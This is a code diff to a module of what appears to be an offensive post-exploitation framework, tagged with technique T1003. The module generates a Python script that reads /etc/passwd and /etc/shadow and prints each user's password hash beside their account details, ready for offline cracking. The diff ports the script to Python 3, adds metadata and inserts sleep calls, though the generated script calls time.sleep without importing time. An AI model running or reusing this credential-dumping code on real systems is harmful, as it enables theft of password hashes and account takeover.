@@ -1,7 +1,8 @@
+from builtins import object
 from lib.common import helpers
 import pdb
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -15,6 +16,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ("Extracts the /etc/passwd and /etc/shadow, unshadowing the result."),
+
+            'Software': '',
+
+            'Techniques': ['T1003'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -32,7 +37,7 @@ class Module:
             'Language' : 'python',
 
             # the minimum language version needed
-            'MinLanguageVersion' : '2.6',
+            'MinLanguageVersion' : '3.6',
 
             # list of any references/other comments
             'Comments': []
@@ -68,10 +73,6 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
-f = open("/etc/passwd")
-passwd = f.readlines()
-f.close()
-
 f2 = open("/etc/shadow")
 shadow = f2.readlines()
 f2.close()
@@ -83,12 +84,20 @@ for line in shadow:
     username, pwdhash = parts[0], parts[1]
     users[username] = pwdhash
 
+f = open("/etc/passwd")
+passwd = f.readlines()
+f.close()
+
+
 for line in passwd:
     parts = line.strip().split(":")
     username = parts[0]
-    info = ":".join(parts[2:])
+    tmp = parts[2:]
+    info = ':'.join(tmp)
+    time.sleep(0.01)
     if username in users:
-        print "%s:%s:%s" %(username, users[username], info)
+        time.sleep(0.01)
+        print("%s:%s:%s" %(username, users[username], info))
 """
 
         return script
